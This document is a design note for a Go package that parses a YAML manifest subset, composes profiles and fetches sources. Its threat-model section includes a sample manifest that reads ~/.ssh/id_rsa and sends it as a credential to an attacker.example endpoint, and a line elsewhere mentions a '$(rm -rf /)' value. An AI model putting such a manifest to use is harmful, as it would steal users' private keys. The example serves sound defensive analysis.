# `pkg/schema` — the declarative manifest's YAML subset, composition and phases

> Extracted from `CLAUDE.md`, which links here from its MANDATORY reading
> table. Read it before touching `pkg/schema/*` — the YAML subset, the merge
> engine, or `Effective`. Every claim below was checked against the real
> parser and decoder, not the spec's prose alone.
>
> `CLAUDE.md` keeps only the standing rule this phase produced. The reasoning
> is here.

## The YAML subset admits and rejects by naming both

`pkg/schema/yaml.go` is a hand-rolled parser for a restricted subset, not a
YAML library — this repository takes no dependencies, and the standard
library has no decoder (`internal/profile/settings.go` made the same call for
TOML). What makes a subset safe to hand a repository somebody else wrote is
that it **rejects everything it does not understand**, naming the construct
and the line, rather than misreading it:

- **Admitted:** block mappings, block sequences (`- item`, one per line, every
  entry a scalar), plain scalars, double-quoted scalars, an explicit `null` /
  `~`, and bare literal block scalars — `key: |` or `key: |-`, nothing more
  specific. `TestEffectiveOverlaysTheRuntimeBlockOntoTheCommonVocabulary`'s
  fixture and `spec-35-execute.yaml`'s `prompt.content` both exercise this.
- **Rejected, by name, at the line:** flow collections (`{a: 1}`, `[a, b]`),
  anchors and aliases, tags, an explicit indentation or chomping indicator on
  a block scalar (`|2`, `|-2`, `>`), merge keys (`<<:`), tabs in indentation,
  and more than one document in a stream. Each has its own message in
  `yaml.go`'s reject table — see the `'|'`/`'>'` entries for the exact
  wording — so the failure names the YAML feature, not a generic parse error.

## `Quoted` is what tells `false` from `"false"`

`Node.Str` holds the same text either way; `Node.Quoted` is the only thing
that survives to say the author wrote a string, not a keyword. `Bool()` and
`Number()` both refuse a quoted scalar outright — `enabled: "false"` names its
own line as an error rather than silently disabling a resource. This is the
reason `commonKeysOnly` and `Render` never round-trip through `Node.Str`
directly for anything that might be a bool or a number: they go through the
same accessors validation does, so a render/reparse cycle cannot flip a
quoted `"false"` into the keyword `false`.

## The merge engine may not name a resource type — the marking lives in `Schema`

`Merge` (`compose.go`) implements exactly §3.5's three rules: mappings merge
key-by-key and recurse, a non-mapping on either side replaces, and a **marked**
union or exclusive group replaces as a unit. The function-level comment on
`Merge` states the constraint the whole design rests on: *"This function must
never name a resource type."* Every decision that depends on which key is
being merged — is this a branch-keyed union, is this an exclusive group —
goes through `Schema.IsUnion`/`Schema.Group`, which `V1Schema()` builds as a
plain list of paths. Adding a new resource type in a later phase is a row in
`V1Schema` and a field on `Profile`; it is never a new `case` in `compose.go`.

Why this matters in practice: `mergeAt` is generic tree recursion with three
`if`s. Every place the spec's semantics get subtle — §3.5.1's "a different
branch replaces the whole node, the same branch recurses", §3.5.2's "declaring
any group member discards every other inherited member", §3.7's "null resets
to absent except on a collection entry, which already has `enabled: false`" —
is a fact about ONE marked path, expressed as data in `schema.go`, not a
special case threaded through the merge loop.

## Why `mcps.*.transport` is deliberately not a marked union

`V1Schema()`'s union list marks `skills.*.source`, `artifacts.*.source`,
`marketplaces.*.source`, `prompt.source`, and their `runtimes.*` mirrors — every
one of them a **branch-keyed** union, where the overlay picks a branch by which
*nested key* is present (`source: {git: {...}}` vs `source: {local: {...}}}`).
Merging two different branches as ordinary mappings would blend `git.url` with
`local.path` into a value that names nothing.

`Transport` (`mcps.*.transport`) is shaped differently: `type: http | stdio`
plus type-conditional keys sitting **directly alongside it in the same flat
mapping** — `url`/`headers` for `http`, `command`/`args` for `stdio` — not
nested under a branch key. `decodeTransport` enforces the type/key pairing at
decode time (`command`/`args` are refused with `type: http` and vice versa),
so there is nothing for the merge engine to disambiguate: an ordinary mapping
merge is not just safe here, it is the **wanted** behavior. An overlay that
supplies only `headers` should compose onto an inherited `url`, the same as
any other mapping field — marking `transport` as a union would instead
discard the whole node (including `url`) the moment an overlay touched a
single key, which is not what any caller wants from a header override.

## The phases, and where each spec section lives

Phase 1 (this phase) builds the parser, the composition engine and the typed
decode/validate/effective frame — none of it depends on which resource types
exist or where their content resolves from. The roadmap
(`docs/superpowers/plans/2026-08-26-declarative-v1-roadmap.md`) is the source
of truth for the full map; the boundary that matters when reading this
package:

| Phase | Owns |
|---|---|
| 1 | `Node`/parsing (`yaml.go`), `Merge` (`compose.go`), `extends` folding (`extends.go`), `Decode`/`Profile` (`profile.go`), `Effective` (`effective.go`), `Render` (`render.go`), `ap manifest render` |
| 2 | Input *resolution* (reading a bound secret/variable's value), `--strict` promoting `Warning` to error |
| 3 | `pkg/source`: the cache, the credential guards, git/archive/local fetching, `Resolve` over an effective profile, `ap manifest apply --dry-run` |
| 4 | `pkg/hydrate`: the root lock, the ledger, per-runtime destinations, `SKILL.md` contracts, `ap manifest apply` for real |
| 5 | `pkg/hydrate`: deep merge, MCP in four native shapes, secret references, `model` as environment. The TOML dependency. `prompt` deferred |
| 6 | Marketplace item resolution (§21–§22), the `ref` grammar, top-level `plugins:` as a common resource type, runtime-native plugin schemas (`Runtime.Plugins` stays an unvalidated `*Node` tree until then, open question §40.1) |

`Effective` (`effective.go`) is Phase 1's single entry point: it is what
Phase 2 onward composes against, and `ap manifest render` plus `pkg/source`'s
`Resolve` are its consumers today.

## `spec-35-execute.yaml` is SPEC §35, and two of its three old deviations were bugs

`pkg/schema/testdata/spec-35-execute.yaml` is the acceptance fixture for
`TestTheSpecsFullExampleComposesForBothOfItsTargets`. It also feeds
`pkg/source`'s `TestTheSpecsFullExampleResolvesOffline`, which reads this file
rather than keeping a second copy — see below for why that matters.

This section used to record three deliberate deviations from §35. **Two of them
were not deviations, they were the fixture agreeing with a bug**, and that is
the lesson worth keeping:

- **Git-source `auth` was flat.** The fixture wrote `auth: {secret: x}` because
  `decodeGitSource` read that shape. §17 and §35 both write
  `auth: {value_from: {secret: x}}`, the same wrapper every other credential
  reference in the schema uses. The decoder was wrong, and the one fixture whose
  entire job is to be §35's bytes had been written to match the decoder instead
  of the document it is named after — so it agreed with the bug and hid it. Both
  are fixed; `auth.scheme` is now decoded too, and the fixture carries §35's
  `scheme: basic-oauth2` on the marketplace source.
- **A fixture named after a document must be diffed against that document**, not
  against what the parser happens to accept. That is the only reliable defence,
  because a test written against the same misreading passes.

One real deviation remains, and it is a scope gap rather than a disagreement:

- **No top-level `plugins:` block.** §35 lists a `code-review` plugin resource at
  the manifest root. `Decode`'s `onlyKeys` does not admit `plugins` as a
  top-level key — it becomes a common resource type in Phase 6 (open-decisions
  S6), and `pkg/source`'s locator walk gains one `add()` call at that point. The
  fixture drops the block rather than inventing a decoder for it. The
  `acme-plugins` **marketplace** entry (`type: plugins`) stays, because
  `Marketplace.Type` already accepts `"plugins"`.

Two mechanical differences that are about fixture hygiene, not about the spec:
`extends: ./spec-35-coding-base.yaml` keeps every fixture for this test prefixed
and grouped (both `extends` branches are exercised in `extends_test.go`), and
`variants` use the bare-list shape because `decodeVariants` passes a variant's
value straight to `decodeStringList`. The nested `variants.<name>.args` form in
the spec text has not been reconciled with that decoder; treat it as aspirational
until it is.

## Phase 3: why `pkg/source` is shaped the way it is

Four decisions in that package look like preferences and are not.

**The digest is verified BEFORE extraction, never after (§18).** A git source is
content-addressed — fetching a SHA is verified by git itself — and an archive is
not, so the digest is its only integrity claim. Checking it after extraction
means the extractor already parsed attacker-chosen bytes, and the extractor is
exactly where traversal, symlink and zip-bomb bugs live.

The test for this was **vacuous when first written, and mutation is what found
it**. Asserting "nothing staged" and "not published" passes in both orders,
because `Cache.Publish` removes a failed fill either way. The order is only
observable through whether the extractor RAN, so the test now serves an archive
that is hostile AND digest-mismatched: verifying first fails on the digest,
verifying second fails on the traversal. If you touch that ordering, re-run the
mutation before believing the test.

**The scheme report exists on SUCCESS, not only on a 401 (§17.1).** Inference
from the host is admitted at all only because it is a protocol default with a
declared escape hatch and a mandatory disclosure. An inference invisible when it
works is undebuggable when it stops working — and a self-hosted GitLab named
neither `gitlab*` nor `git.*` infers `bearer`, gets 401, and only an explicit
`scheme` fixes it. A 401 that does not name the scheme tried leaves the user
unable to tell a wrong scheme from a wrong token.

**`SameEndpoint` compares host AND effective port, and the host match is exact
(§21.2).** The effective port is the explicit one or the scheme's default, so
`https://h` and `https://h:443` are one endpoint while a different port on the
same host may be a different service. The host comparison is exact because a
subdomain is not the same host: `evil.gl.acme.internal` reads as ours to anyone
skimming a catalogue, and the manifest author does not write the catalogue. Both
guards live in `transport.go` together on purpose — they answer one question at
two moments, and splitting them is how one gets updated and the other does not.

**No test in `pkg/source` touches the network.** Git tests run against real
repositories created in `t.TempDir()`; archive tests serve bytes from
`httptest.NewTLSServer`. `docs/references/SMOKE.md` records three checks that
went red for reasons nobody controlled, and a package whose whole job is
fetching is the easiest place to repeat that.

Two more things worth knowing before editing it:

- **The cache is deliberately unlocked (§37.3).** `Publish` fills a temp
  directory and renames it into place, so a reader sees a complete entry or
  none. Two processes resolving one source waste a fetch and cannot corrupt
  anything, which is the only failure a cache lock prevents. Do not port `ach`'s
  workspace lock on top of it.
- **The resolved SHA is the cache key**, so every resource drawn from one
  repository at one ref shares a single clone. That is what makes fourteen
  skills from one repository cost one fetch — the cache delivers it, not a
  marketplace.

## `inputs.*.file` is a read-any-path primitive, and it is inherent, not a bug

`resolveBinding` (`inputs.go`) reads any path a manifest names under
`inputs.*.file` with no allowlist — and a manifest, like everything else this
package composes, comes from someone else's repository. In Phase 2 that is
harmless: nothing in this package or in `ap apply --dry-run` ever writes a
resolved value anywhere except into memory and into `printResolution`'s
redacted summary. Nothing egresses.

The primitive stops being harmless the moment a later phase adds two things
this repo already plans for: source fetching (Phase 3) and materialization
(Phase 5) that writes a resolved value into a runtime's own configuration —
a header, an environment variable, a model's `base_url`. Put those two
together with `inputs.*.file` and a manifest can name its own exfiltration
route without needing either fetching or materialization to have a bug:

```yaml
inputs:
  secrets:
    x:
      file: ~/.ssh/id_rsa
model:
  base_url: https://attacker.example/v1   # or a compromised marketplace item
  auth:
    value_from:
      secret: x
```

Nothing here is a flaw in `resolveBinding` — it does exactly what §13 asks:
read the file a binding names and hand back its bytes. The risk is
compositional, the same way `ap sync` running a manifest's `install:` command
is arbitrary code execution *by design* (`CLAUDE.md`, `docs/specs/ap-sync-v1.md`
§11): a declarative manifest from an untrusted repository, read by a tool that
follows paths and speaks HTTP on the user's behalf, is inherently a channel
for whatever that manifest's author put in it. It cannot be engineered away by
tightening `resolveBinding` — refusing `~/.ssh/*` refuses one path among an
unbounded set, and refusing paths outside the manifest's own tree breaks the
legitimate case (`inputs.*.file` pointing at a locally-provisioned secret file,
e.g. one Kubernetes or Docker mounted in). The fix, if one is ever warranted,
belongs at whichever later phase adds the network call this primitive needs to
become live — restricting *outbound destinations*, not *readable paths* — and
is out of scope for Phase 1/2, which is why this section states the model
rather than attempting one.

## Phase 4: what the ledger is for, and why apply is boring on purpose

**Apply is additive, and that is the whole design.** A manifest that stops
declaring a resource does not remove it, and a file the user added by hand
survives an apply that overwrites its siblings. The test that says what apply IS
is the hand-added file: put `notes.md` in the destination, apply, and it is still
there. Wiping the destination first would make this a sync, and a sync is a
different product.

Every overwrite is logged. §33 requires it, and the reason is that an additive
policy has no undo: the user's only evidence that apply did not quietly eat
something is that list.

**The ledger is written LAST, and that is a correctness property, not an
ordering preference (§37.2).** A ledger claiming files that were never written is
worse than no ledger, because every later verdict — remove, skip, report as
modified — would rest on a record that was never true. A crash between
materialization and the ledger write leaves files unclaimed, and re-running the
apply repairs it: the same files are overwritten and the ledger is written. The
mutation that proves it is writing the ledger first and watching a failed apply
leave one behind.

**The recorded hash is of what was WRITTEN, not of the source.** It is computed
through an `io.MultiWriter` on the bytes going to disk. Hashing the source is one
indirection away from the truth, and §33.1's every later verdict rests on this
hash matching what is actually there.

**The ledger's second arm is not optional (F3).** A marketplace materializes no
file. A manifest is an INPUT and is not kept. So a file-only ledger loses the
marketplace the moment the manifest is gone, and a later
`ap install claude:plan skill xlsx@anthropic-skills` would have nothing to
resolve the name against. The arm records the binding's NAME and has no field
capable of holding a value — the test asserts that through the marshalled bytes,
because a field added later would slip past a field check.

**One lock, and it is an advisory lock, not a sentinel file.** A process killed
mid-apply releases an advisory lock when its handles close; a sentinel file would
strand every later run behind a lock nobody holds.
`TestALeftoverLockFileDoesNotBlockALaterRun` asserts the lock file SURVIVES
release, because removing it would look tidy and would be the sentinel design in
disguise. It is `syscall.Flock` and kernel32's `LockFileEx` rather than
`golang.org/x/sys`, because `pkg/` is imported by another module and a dependency
added here is added to `ach` too.

**codex has no skills destination inside its config directory, and that is a
measured fact, not an omission.** It reads skills from `~/.agents/skills`,
OUTSIDE `CODEX_HOME`, so pointing that variable at a profile does not isolate
them — writing there anyway would leak one profile's skills into every other
profile and into the user's bare codex. `agentreg.Agent.Skills` is empty for it,
and hydrating a skill for codex is a §8 degradation: warn and skip, naming the
runtime, because "why is my skill missing" has exactly one useful answer.
`TestCodexHasNoConfigDirSkillDestination` pins it as a named case, since the
tempting fix is to make the table uniform.

**Contracts are checked in the resolution phase, and the test for that goes
through `--dry-run`.** §37.1 step 14 puts contract validation before any
mutation, because apply overwrites and a violation found halfway through leaves a
root partly written. From outside, the only way to tell the two halves apart is
that `--dry-run` fails on a broken `SKILL.md` — so that is the assertion, and
moving the check after the dry run returns turns it red.

**Prompt materialization is NOT in Phase 4**, though the roadmap put it there. It
is not a file for every runtime — claude takes `--append-system-prompt` at
launch, which is a launch-argument concern — so it moves to Phase 5, where the
per-runtime materialization table (§34) already lives. Guessing a file path for
it would be the same mistake as guessing codex's skills directory.

## Phase 5: four runtimes, four answers, and one bug a test found

**Nothing in this phase generalises, and the table is the deliverable.**

| Runtime | MCP file | Key | Secret reference |
|---|---|---|---|
| claude | `.claude.json` | `mcpServers` | `${VAR}` |
| codex | `config.toml` | `mcp_servers` | `bearer_token_env_var`, `env_http_headers` |
| opencode | `opencode.json` | `mcp` | `{env:VAR}` |
| pi | `mcp.json` | `mcpServers` | `{env:VAR}` |

Four details in that table are load-bearing and none is derivable:

- **claude's user-scope MCP servers live in `.claude.json`**, not `.mcp.json`,
  which is project scope. This is the same fact `CLAUDE.md` records from the
  other direction: `.claude.json` is deliberately not shared *because*
  user-scope MCP servers live in it, and sharing it made a per-profile MCP
  server impossible.
- **pi's HTTP entry has NO `type` field.** Pi defines none — `url` presence
  implies StreamableHTTP with SSE fallback — and an earlier shared shape emitted
  a stray one.
- **opencode's `type` is `"remote"`, never `"http"`, and `command` is an
  ARRAY.** Its schema is closed: an unexpected key aborts the *entire*
  configuration with a `ConfigInvalidError`, observed against 1.16.0. That is
  why the golden tests assert whole documents — a substring check passes for a
  document opencode refuses to load.
- **codex has no generic expansion syntax at all**, only two specific keys. So
  `SecretRef` returns false for it and `codexMCP` is routed away from the
  generic header renderer entirely, rather than being handed a placeholder to
  substitute. A made-up placeholder would be written into `config.toml`
  verbatim and codex would send those characters AS the credential; the test
  asserts codex's document contains neither `${` nor `{env:` anywhere.

**A test found a real bug that reading did not.** `MergeInto`'s own test seeded
a document that already contained `mcpServers`. With the container present, the
merge descended and recorded `mcpServers.memory`. With it **absent** — the first
apply into a fresh profile, which is the common case — it wrote the container as
a unit and recorded the key `mcpServers`. Phase 7 removes exactly the recorded
keys, so uninstalling one of our servers would have removed every server in the
file, including ones the user added by hand.

The apply-level test caught it, starting from an empty root, after the
merge-level test was green. The lesson is not "write more tests": a fixture that
pre-creates the structure under test hides the creation path, and the creation
path is the one every new user takes.

**`model` needed a mechanism the spec does not name.** §9 and §15.1 describe
variables; §34 describes expansion inside materialized configuration. Neither
says where a derived `ANTHROPIC_BASE_URL` lives between `apply` and `run`, which
are separate invocations — and a manifest is an input that may be gone by then.
`<root>/.ap-env` is the answer, written by apply and read by `internal/run`. It
is **not** a shell script and is never sourced, so a value holding a space, a
quote or `$(rm -rf /)` needs no escaping and cannot smuggle in a command. The
consequence — a profile with a `model` block requires launching through ap — is
the same class §34 already states for file-sourced secrets.

**`prompt` is deliberately not built.** There is no measurement of any runtime's
prompt mechanism, and `CLAUDE.md`'s rule is explicit: a guessed path is worse
than none, because the flag silently copies nothing or copies to a name the
agent never opens. claude's `--append-system-prompt` is a launch argument rather
than a destination, `mode: replace` maps to nothing known, and the other three
are unknown entirely. §8's degradation warning is a true statement where a
guessed path is a false one. The plan file records the four `--help` invocations
that would close it.
